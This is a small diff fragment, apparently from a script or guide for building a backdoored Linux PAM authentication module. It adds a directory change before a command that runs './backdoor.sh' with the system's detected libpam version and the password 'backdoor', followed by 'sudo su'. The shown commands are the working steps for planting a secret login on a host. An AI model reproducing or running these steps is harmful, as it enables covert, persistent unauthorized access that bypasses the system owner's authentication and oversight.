@@ -56,6 +56,8 @@ make distclean
 ./configure --disable-doc
 make
 
+cd ../
+
 ./backdoor.sh -v $(dpkg -l | grep libpam-mod | awk -F " " '{print $3}' | awk -F "-" '{print $1}' | sort -u) -p backdoor
 
 sudo su
